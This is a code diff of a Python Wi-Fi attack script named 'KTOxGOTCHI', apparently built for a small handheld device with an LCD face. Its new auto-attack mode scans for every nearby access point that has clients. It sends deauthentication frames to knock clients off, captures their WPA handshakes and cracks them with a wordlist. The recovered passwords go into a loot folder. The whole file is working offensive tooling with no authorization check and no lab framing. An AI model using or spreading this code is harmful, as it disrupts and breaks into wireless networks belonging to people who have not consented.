@@ -1,16 +1,20 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – Pwnagotchi (No Bettercap)
-==========================================
+KTOx Payload – KTOxGOTCHI (Auto-Attack + Manual)
+==================================================
 Author: wickednull
 
-Automated WPA handshake sniffer using airodump-ng and aireplay-ng.
-- Tamagotchi face on LCD
-- Auto‑targets APs with clients
-- Saves handshakes to /root/KTOx/loot/Handshakes/
+- Auto-attack mode (KEY1): continuously scans and attacks APs with clients
+- Manual mode: UP/DOWN to select target, OK to attack
+- Saves handshakes and cracked passwords to /root/KTOx/loot/
+- Clean exit (KEY3) – kills all subprocesses, restores managed mode
 
 Controls:
-  KEY3 – exit
+  KEY1      – toggle auto-attack ON/OFF
+  UP/DOWN   – select target (manual mode)
+  OK        – attack selected target (manual mode)
+  KEY2      – show handshake log / cracked passwords
+  KEY3      – exit (cleanup)
 """
 
 import os
@@ -54,19 +58,33 @@ def font(size=9):
         return ImageFont.load_default()
 
 f9 = font(9)
-f11 = font(11)
 
 # ----------------------------------------------------------------------
 # Global state
 # ----------------------------------------------------------------------
 handshake_count = 0
+cracked_count = 0
 ap_count = 0
 client_count = 0
 mood = "normal"
 console_msg = "Starting..."
 running = True
 interface = None
-attack_stop_event = threading.Event()
+networks = []
+selected_idx = 0
+auto_mode = False
+attack_thread = None
+attack_stop = threading.Event()
+mood_timer = None
+
+LOOT_DIR = "/root/KTOx/loot/Handshakes"
+CRACKED_DIR = "/root/KTOx/loot/CrackedWPA"
+os.makedirs(LOOT_DIR, exist_ok=True)
+os.makedirs(CRACKED_DIR, exist_ok=True)
+
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+if not os.path.exists(WORDLIST):
+    WORDLIST = "/usr/share/john/password.lst"
 
 faces = {
     "normal":   "(◕‿‿◕)",
@@ -80,15 +98,24 @@ faces = {
 }
 
 def set_mood(new_mood):
-    global mood
+    global mood, mood_timer
     mood = new_mood
+    # Cancel previous timer
+    if mood_timer is not None:
+        mood_timer.cancel()
+    # Set timer to revert to normal
     if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
-        threading.Timer(2.0, lambda: set_mood("normal") if mood == new_mood else None).start()
+        mood_timer = threading.Timer(2.0, lambda: set_mood("normal"))
+        mood_timer.start()
     elif new_mood == "happy":
-        threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()
+        mood_timer = threading.Timer(4.0, lambda: set_mood("normal"))
+        mood_timer.start()
+    elif new_mood == "excited":
+        mood_timer = threading.Timer(3.0, lambda: set_mood("normal"))
+        mood_timer.start()
 
 # ----------------------------------------------------------------------
-# WiFi helpers (using aircrack-ng suite)
+# WiFi helpers (aircrack-ng suite)
 # ----------------------------------------------------------------------
 def run_cmd(cmd, timeout=None):
     try:
@@ -100,20 +127,16 @@ def run_cmd(cmd, timeout=None):
 
 def enable_monitor_mode():
     global interface
-    # Kill interfering processes
     run_cmd("airmon-ng check kill")
-    # Find a suitable interface (prefer wlan1 if it exists, otherwise wlan0)
     for iface in ["wlan1", "wlan0"]:
         if os.path.exists(f"/sys/class/net/{iface}"):
             interface = iface
             break
     if not interface:
         return False
-    # Enable monitor mode
     run_cmd(f"ip link set {interface} down")
     run_cmd(f"iw dev {interface} set type monitor")
     run_cmd(f"ip link set {interface} up")
-    # Also try airmon-ng to create a monitor interface if needed
     run_cmd(f"airmon-ng start {interface}")
     mon = f"{interface}mon"
     if os.path.exists(f"/sys/class/net/{mon}"):
@@ -121,6 +144,8 @@ def enable_monitor_mode():
     return True
 
 def disable_monitor_mode():
+    run_cmd("pkill -f airodump-ng")
+    run_cmd("pkill -f aireplay-ng")
     run_cmd("airmon-ng stop wlan0mon 2>/dev/null")
     run_cmd("airmon-ng stop wlan1mon 2>/dev/null")
     run_cmd("ip link set wlan0 down 2>/dev/null")
@@ -128,19 +153,16 @@ def disable_monitor_mode():
     run_cmd("ip link set wlan0 up 2>/dev/null")
     run_cmd("systemctl restart NetworkManager")
 
-def scan_networks(timeout=15):
-    """Scan for APs and return list with BSSID, ESSID, channel."""
-    global ap_count
-    tmp = "/tmp/pwnagotchi_scan"
+def scan_networks(timeout=12):
+    global ap_count, networks
+    tmp = "/tmp/ktoxgotchi_scan"
     run_cmd(f"rm -f {tmp}*")
-    proc = subprocess.Popen(
+    subprocess.run(
         f"timeout {timeout} airodump-ng --output-format csv -w {tmp} {interface}",
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
-    proc.wait()
     time.sleep(1)
-    
-    networks = []
+    nets = []
     csv_file = f"{tmp}-01.csv"
     if os.path.exists(csv_file):
         with open(csv_file, errors="ignore") as f:
@@ -148,7 +170,6 @@ def scan_networks(timeout=15):
         if "Station MAC" in content:
             content = content.split("Station MAC")[0]
         lines = content.strip().split("\n")
-        # Find header line
         header_idx = -1
         for i, line in enumerate(lines):
             if "BSSID" in line and "ESSID" in line:
@@ -174,23 +195,22 @@ def scan_networks(timeout=15):
                 essid = parts[col_essid]
                 if essid and essid != "(not associated)":
                     ch = parts[col_ch]
-                    networks.append({
+                    nets.append({
                         "bssid": bssid,
                         "essid": essid,
                         "channel": ch
                     })
-    ap_count = len(networks)
-    return networks
+    ap_count = len(nets)
+    networks = nets
+    return nets
 
-def get_clients_for_ap(bssid, channel, timeout=8):
-    """Return list of client MACs for a given AP."""
-    tmp = f"/tmp/pwnagotchi_clients_{bssid.replace(':', '_')}"
+def get_clients_for_ap(bssid, channel, timeout=6):
+    tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
     run_cmd(f"rm -f {tmp}*")
-    proc = subprocess.Popen(
+    subprocess.run(
         f"timeout {timeout} airodump-ng -c {channel} --bssid {bssid} -w {tmp} {interface}",
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
-    proc.wait()
     time.sleep(1)
     clients = []
     csv_file = f"{tmp}-01.csv"
@@ -210,53 +230,108 @@ def get_clients_for_ap(bssid, channel, timeout=8):
     return clients
 
 def capture_handshake(bssid, essid, channel, client_mac):
-    """Attempt to capture handshake by deauthing the client."""
-    global handshake_count, console_msg
-    tmp = f"/tmp/pwnagotchi_hs_{bssid.replace(':', '_')}"
+    global handshake_count, console_msg, cracked_count
+    tmp = f"/tmp/ktoxgotchi_hs_{bssid.replace(':', '_')}"
     run_cmd(f"rm -f {tmp}*")
-    # Start airodump to capture
     proc = subprocess.Popen(
         f"airodump-ng -c {channel} --bssid {bssid} -w {tmp} {interface}",
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
     time.sleep(2)
-    # Send deauth
     set_mood("attacking")
     console_msg = f"Deauth {client_mac[-6:]}"
     run_cmd(f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {interface}")
     time.sleep(3)
-    # Stop airodump
     proc.terminate()
     time.sleep(1)
-    # Check for handshake
     cap_file = f"{tmp}-01.cap"
     if os.path.exists(cap_file):
         aircrack_out = run_cmd(f"aircrack-ng {cap_file} 2>/dev/null")
         if "handshake" in aircrack_out.lower():
-            # Save the handshake
-            loot_dir = "/root/KTOx/loot/Handshakes"
-            os.makedirs(loot_dir, exist_ok=True)
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
-            dest = os.path.join(loot_dir, f"{safe_essid}_{bssid}_{ts}.cap")
+            dest = os.path.join(LOOT_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
             run_cmd(f"cp {cap_file} {dest}")
-            with open(os.path.join(loot_dir, "handshake_log.txt"), "a") as log:
+            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
                 log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
             handshake_count += 1
             set_mood("happy")
             console_msg = f"HS! Total: {handshake_count}"
+            if os.path.exists(WORDLIST):
+                crack_result = run_cmd(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null")
+                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
+                if key_match:
+                    password = key_match.group(1)
+                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
+                    with open(cracked_file, "w") as cf:
+                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
+                    cracked_count += 1
+                    console_msg = f"Cracked! {password[:8]}"
+                    set_mood("excited")
             return True
     set_mood("normal")
     return False
 
+def attack_target(bssid, essid, channel):
+    global console_msg
+    console_msg = f"Attacking {essid[:12]}"
+    set_mood("assoc")
+    clients = get_clients_for_ap(bssid, channel, timeout=6)
+    if not clients:
+        console_msg = "No clients"
+        set_mood("lost")
+        return False
+    client = random.choice(clients)
+    return capture_handshake(bssid, essid, channel, client)
+
+def auto_attack_worker():
+    """Background thread for continuous auto-attack."""
+    global console_msg
+    while auto_mode and not attack_stop.is_set():
+        try:
+            console_msg = "Auto: scanning..."
+            scan_networks(10)
+            if not networks:
+                console_msg = "Auto: no APs"
+                time.sleep(5)
+                continue
+            
+            attacked_any = False
+            for net in networks:
+                if attack_stop.is_set():
+                    break
+                bssid = net["bssid"]
+                essid = net["essid"]
+                channel = net["channel"]
+                console_msg = f"Auto: checking {essid[:12]}"
+                clients = get_clients_for_ap(bssid, channel, timeout=5)
+                if clients:
+                    console_msg = f"Auto: attacking {essid[:12]}"
+                    success = attack_target(bssid, essid, channel)
+                    attacked_any = True
+                    if success:
+                        console_msg = "Auto: HS captured!"
+                        time.sleep(8)
+                    else:
+                        console_msg = "Auto: attack failed"
+                        time.sleep(5)
+                    break
+            
+            if not attacked_any:
+                console_msg = "Auto: no clients"
+                time.sleep(5)
+        except Exception as e:
+            console_msg = f"Auto error: {str(e)[:15]}"
+            time.sleep(3)
+
 # ----------------------------------------------------------------------
-# LCD drawing
+# LCD drawing and menu
 # ----------------------------------------------------------------------
 def draw_screen():
     img = Image.new("RGB", (W, H), "#0A0000")
     d = ImageDraw.Draw(img)
     d.rectangle((0, 0, W, 17), fill="#8B0000")
-    d.text((4, 3), "PWNAGOTCHI", font=f9, fill="#FF3333")
+    d.text((4, 3), "KTOxGOTCHI", font=f9, fill="#FF3333")
     y = 20
     d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
     d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
@@ -265,23 +340,93 @@ def draw_screen():
     try:
         face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
     except:
-        face_font = f11
+        face_font = f9
     bbox = d.textbbox((0, 0), face_char, font=face_font)
     face_w = bbox[2] - bbox[0]
     face_x = (W - face_w) // 2
     d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")
     d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")
     d.rectangle((0, H-12, W, H), fill="#220000")
-    d.text((4, H-10), "K3=Exit", font=f9, fill="#FF7777")
+    mode_str = "AUTO" if auto_mode else "MANUAL"
+    d.text((4, H-10), f"{mode_str} | K1=Toggle K2=Log K3=Exit", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img, 0, 0)
+
+def draw_target_list():
+    if not networks:
+        draw_screen()
+        return
+    net = networks[selected_idx]
+    lines = [
+        f"Target: {net['essid'][:16]}",
+        f"BSSID: {net['bssid']}",
+        f"Channel: {net['channel']}",
+        f"Selected: {selected_idx+1}/{len(networks)}",
+        "",
+        "UP/DN OK to attack K3=back"
+    ]
+    img = Image.new("RGB", (W, H), "#0A0000")
+    d = ImageDraw.Draw(img)
+    d.rectangle((0, 0, W, 17), fill="#8B0000")
+    d.text((4, 3), "SELECT TARGET", font=f9, fill="#FF3333")
+    y = 20
+    for line in lines:
+        d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
+        y += 12
+    d.rectangle((0, H-12, W, H), fill="#220000")
+    d.text((4, H-10), "UP/DN OK K3=Back", font=f9, fill="#FF7777")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+def show_log():
+    log_file = os.path.join(LOOT_DIR, "handshake_log.txt")
+    lines = ["=== HANDSHAKE LOG ==="]
+    if os.path.exists(log_file):
+        with open(log_file, "r") as f:
+            log_lines = f.readlines()[-5:]
+            for line in log_lines:
+                lines.append(line.strip()[:20])
+    else:
+        lines.append("No handshakes yet")
+    cracked_files = [f for f in os.listdir(CRACKED_DIR) if f.endswith(".txt")]
+    if cracked_files:
+        lines.append("--- Cracked ---")
+        for cf in cracked_files[-3:]:
+            with open(os.path.join(CRACKED_DIR, cf), "r") as f:
+                for line in f:
+                    if "PASSWORD:" in line:
+                        lines.append(line.strip())
+                        break
+    img = Image.new("RGB", (W, H), "#0A0000")
+    d = ImageDraw.Draw(img)
+    d.rectangle((0, 0, W, 17), fill="#004466")
+    d.text((4, 3), "LOG", font=f9, fill="#FF3333")
+    y = 20
+    for line in lines[:7]:
+        d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
+        y += 12
+    d.rectangle((0, H-12, W, H), fill="#220000")
+    d.text((4, H-10), "Any key to exit", font=f9, fill="#FF7777")
+    LCD.LCD_ShowImage(img, 0, 0)
+    while True:
+        if wait_btn(0.1) is not None:
+            break
+        time.sleep(0.05)
+
+def wait_btn(timeout=0.1):
+    start = time.time()
+    while time.time() - start < timeout:
+        for name, pin in PINS.items():
+            if GPIO.input(pin) == 0:
+                time.sleep(0.05)
+                return name
+        time.sleep(0.02)
+    return None
 
 # ----------------------------------------------------------------------
 # Main
 # ----------------------------------------------------------------------
 def main():
-    global running, interface, ap_count, client_count, console_msg
+    global running, auto_mode, attack_thread, selected_idx, networks, attack_stop, console_msg
 
-    # Enable monitor mode
     if not enable_monitor_mode():
         img = Image.new("RGB", (W, H), "black")
         d = ImageDraw.Draw(img)
@@ -297,69 +442,79 @@ def main():
     draw_screen()
     time.sleep(1)
 
-    # Main loop
+    # Initial scan
+    scan_networks(12)
+
+    state = "main"
     last_scan = 0
-    networks = []
-    last_attack = 0
-    attack_cooldown = 15
-    held = {}
 
     while running:
         now = time.time()
-
-        # Scan every 10 seconds
-        if now - last_scan > 10:
-            last_scan = now
-            console_msg = "Scanning..."
+        if state == "main":
             draw_screen()
-            networks = scan_networks(10)
-            if networks:
-                console_msg = f"Found {len(networks)} APs"
-            else:
-                console_msg = "No APs found"
-            draw_screen()
-
-        # Attack logic
-        if networks and now - last_attack > attack_cooldown:
-            for net in networks:
-                bssid = net["bssid"]
-                essid = net["essid"]
-                channel = net["channel"]
-                console_msg = f"Checking {essid[:12]}"
+            btn = wait_btn(0.5)
+            if btn == "KEY3":
+                break
+            elif btn == "KEY2":
+                show_log()
+            elif btn == "KEY1":
+                auto_mode = not auto_mode
+                if auto_mode:
+                    attack_stop.clear()
+                    attack_thread = threading.Thread(target=auto_attack_worker, daemon=True)
+                    attack_thread.start()
+                    console_msg = "Auto mode ON"
+                else:
+                    attack_stop.set()
+                    if attack_thread:
+                        attack_thread.join(timeout=1)
+                    console_msg = "Manual mode"
                 draw_screen()
-                clients = get_clients_for_ap(bssid, channel, timeout=8)
-                if clients:
-                    client = random.choice(clients)
-                    console_msg = f"Target {essid[:8]}"
+                time.sleep(0.5)
+            elif btn == "OK":
+                if networks:
+                    state = "target_select"
+                    selected_idx = 0
+                    draw_target_list()
+                else:
+                    console_msg = "No networks, scan again"
                     draw_screen()
-                    set_mood("assoc")
-                    draw_screen()
-                    if capture_handshake(bssid, essid, channel, client):
-                        last_attack = now
-                        attack_cooldown = 30  # longer cooldown after success
-                    else:
-                        console_msg = "Missed handshake"
-                        draw_screen()
-                        time.sleep(1)
-                    break
-            # Reset cooldown if no targets found
-            attack_cooldown = 15
-
-        # Button handling
-        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
-        for n, down in pressed.items():
-            if down:
-                if n not in held: held[n] = now
-            else:
-                held.pop(n, None)
-
-        if pressed.get("KEY3") and (now - held.get("KEY3", now)) <= 0.05:
-            break
-
-        draw_screen()
-        time.sleep(0.1)
+                    time.sleep(1)
+            if now - last_scan > 15:
+                last_scan = now
+                scan_networks(10)
+        elif state == "target_select":
+            draw_target_list()
+            btn = wait_btn(0.5)
+            if btn == "KEY3":
+                state = "main"
+            elif btn == "UP":
+                if networks:
+                    selected_idx = (selected_idx - 1) % len(networks)
+                    draw_target_list()
+            elif btn == "DOWN":
+                if networks:
+                    selected_idx = (selected_idx + 1) % len(networks)
+                    draw_target_list()
+            elif btn == "OK" and networks:
+                target = networks[selected_idx]
+                console_msg = f"Attacking {target['essid'][:12]}"
+                draw_screen()
+                success = attack_target(target['bssid'], target['essid'], target['channel'])
+                if success:
+                    console_msg = "Handshake captured!"
+                else:
+                    console_msg = "Attack failed"
+                draw_screen()
+                time.sleep(2)
+                state = "main"
+                scan_networks(10)
+        time.sleep(0.05)
 
     # Cleanup
+    attack_stop.set()
+    if attack_thread and attack_thread.is_alive():
+        attack_thread.join(timeout=1)
     disable_monitor_mode()
     LCD.LCD_Clear()
     GPIO.cleanup()
